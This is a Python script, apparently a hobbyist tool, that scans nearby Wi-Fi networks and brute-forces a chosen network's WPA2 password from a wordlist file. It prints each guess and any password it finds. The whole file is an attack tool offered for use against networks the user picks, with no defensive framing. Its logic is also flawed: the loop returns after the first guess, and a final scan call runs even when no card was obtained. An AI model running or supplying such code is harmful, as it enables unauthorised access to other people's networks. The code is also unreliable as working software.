import pywifi  # pyright: ignore[reportMissingImports]
from pywifi import const  # pyright: ignore[reportMissingImports]
import time
#https://github.com/microsoft/pylance-release/blob/main/docs/diagnostics/reportMissingImports.md
# Use comments like # pyright: ignore[reportMissingImports] to suppress warnings for optional or platform-specific imports.

#get the wifi card

def get_card():
    wifi = pywifi.PyWiFi()
    card = wifi.interfaces()[0]  # Get the first wifi card
    card.disconnect() 
    time.sleep(1)
    status = card.status()
    if status not in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
        print("Disconnecting from current network...")
        return False
    return card

# Scan for available networks
def scan_wifi(card):
    print("Scanning for networks...")
    card.scan()
    time.sleep(15)  # Wait for the scan to complete
    wifi_list = card.scan_results()
    print("number:",len(wifi_list))
    index = 1
    for wifi_info in wifi_list:
        print(f"{index},SSID:{wifi_info.ssid}")
        index = index + 1
    return wifi_list

# Main function to execute the script
def crack_wifi(wifi_ssid,card):
    file_path = "password.txt"
    with open(file_path,"r") as password_file:
        for pwd in password_file:
            pwd = pwd.strip()
            if connect_to_wifi(pwd,wifi_ssid,card):
                print("password found:", pwd)
                return pwd
            else:
                print("password not found:", pwd)
                time.sleep(3)
            return None
def connect_to_wifi(pwd, ssid, card):
    profile = pywifi.Profile()
    profile.ssid = ssid
    profile.key = pwd 
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP

    card.remove_all_network_profiles()
    tmp_profile = card.add_network_profile(profile)
    card.connect(tmp_profile)
    time.sleep(5)  # Wait for connection attempt

    if card.status() == const.IFACE_CONNECTED:
        is_connected = True
    else:
        is_connected = False
    card.disconnect()
    time.sleep(1)
    return is_connected

    
card = get_card()
if not card:
    print("No wifi card found or unable to disconnect.")
else:
    wifi_list = scan_wifi(card)
    if not wifi_list:
        print("No wifi networks found.")
    else:
        target_wifi_ssid = int(input("Enter the index of the wifi network to crack: ")) - 1
        target_wifi_ssid = wifi_list[target_wifi_ssid].ssid
        print(f"Cracking wifi network: {target_wifi_ssid}")
        result = crack_wifi(target_wifi_ssid, card)
        if result:
            print(f"Password for {target_wifi_ssid} is: {result}")
        else:
            print("Failed to crack the wifi password.")

scan_wifi(card)
  
